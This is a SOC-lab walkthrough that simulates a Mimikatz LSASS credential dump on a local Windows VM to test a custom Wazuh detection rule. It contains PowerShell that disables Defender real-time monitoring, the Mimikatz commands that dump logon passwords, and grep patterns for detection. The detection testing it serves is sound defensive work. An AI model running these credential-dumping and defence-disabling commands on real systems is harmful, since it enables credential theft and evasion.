# Attack 02 — Mimikatz Credential Dump

## Overview

|Field|Details|
|-|-|
|MITRE ID|T1003.001|
|Tactic|Credential Access|
|Severity|Critical|
|Tool|Mimikatz|
|Wazuh Rule|100002 — Level 14|
|Target|Windows 10 VM (192.168.56.105)|

## Objective

Simulate LSASS memory access using Mimikatz to extract credentials from Windows memory, triggering Sysmon EID 10 and custom Wazuh detection rule 100002.

## Execution Steps

1. Apply custom Sysmon config with EID 10 (LSASS access) enabled
2. Disable Windows Defender temporarily for simulation
3. Start live monitor on Wazuh OVA terminal
4. Run mimikatz.exe as Administrator
5. Execute privilege::debug and sekurlsa::logonpasswords
6. Verify Rule 100002 fires with SHA256 hash captured

## Commands

### Wazuh OVA — Start Live Monitor First

```bash
tail -f /var/ossec/logs/alerts/alerts.log | grep -i "lsass\\|mimikatz\\|100002"
```

### Windows VM — PowerShell as Administrator

```powershell
# Disable Defender for simulation
Set-MpPreference -DisableRealtimeMonitoring $true

# Run Mimikatz
cd "C:\\SOC-Lab\\mimikatz\\x64"
.\\mimikatz.exe

# Inside Mimikatz prompt:
# privilege::debug
# sekurlsa::logonpasswords
# exit

# Re-enable Defender after simulation
Set-MpPreference -DisableRealtimeMonitoring $false
```

## Expected Alert

```
Rule: 100002 (level 14) -> 'Mimikatz execution detected'
Image: C:\\SOC-Lab\\mimikatz\\x64\\mimikatz.exe
SHA256: 61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1
Parent Process: powershell.exe
User: DESKTOP-2F01H2Q\\strix
```

## Detection

* **Rule ID:** 100002 — Level 14 Critical
* **Sysmon EID:** 1 (Process Create), 10 (LSASS Access)
* **Dashboard Search:** mimikatz OR lsass

## Attack Timeline

|Time|Event|
|-|-|
|T+00:00|Sysmon EID 1 — mimikatz.exe spawned by powershell.exe|
|T+00:01|privilege::debug — SeDebugPrivilege obtained|
|T+00:02|Sysmon EID 10 — lsass.exe memory accessed|
|T+00:02|Rule 100002 fires — Level 14 Critical|

## Cleanup

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

